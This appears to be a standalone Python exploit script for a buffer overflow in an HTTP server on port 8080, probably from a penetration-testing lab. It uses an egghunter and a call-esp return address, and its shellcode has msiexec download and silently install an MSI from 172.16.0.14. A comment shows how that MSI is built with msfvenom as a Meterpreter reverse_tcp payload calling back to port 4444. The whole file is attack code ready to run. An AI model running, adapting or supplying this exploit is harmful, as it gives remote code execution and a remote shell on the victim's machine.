import socket
import os
import sys
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Egghunter , tag dude
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x64\x75\x64\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#Put this tag in front of your shellcode : dudedude


#download and execute jasonm.msi from 172.16.0.14 null free 95 Bytes
#msiexec /i http://172.16.0.14/jasonm.msi /qn
#msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=172.16.0.14 -f msi -o jasonm.msi

msi = "\xbb\x35\xde\x7f\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x73\x6f\x6e\x6d\x68\x34\x2f\x6a\x61\x68\x2e\x30\x2e\x31\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x37\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x77\xb1\x8d\x76\xff\xd0\x31\xc0\x50\xb8\x5a\xbe\x80\x77\xff\xd0"

#call esp 77AE57CE   ntdll
#jump back nasm $-120 EB 86

stuff = "A"*473 + egghunter + "\x90"*10 + "\xce\x57\xae\x77" + "\xeb\x86"
otherstuff = "dudedude" + msi
buffer =  "GET /" + stuff + " HTTP/1.1\r\n"
buffer += "Host: 172.16.0.24:8080\r\n"
buffer += "User-Agent: "+ otherstuff + "\r\n"
buffer += "Keep-Alive: 115\r\n"
buffer += "Connection: keep-alive\r\n\r\n"

s.connect(("127.0.0.1", 8080))
s.send(buffer)
s.close()
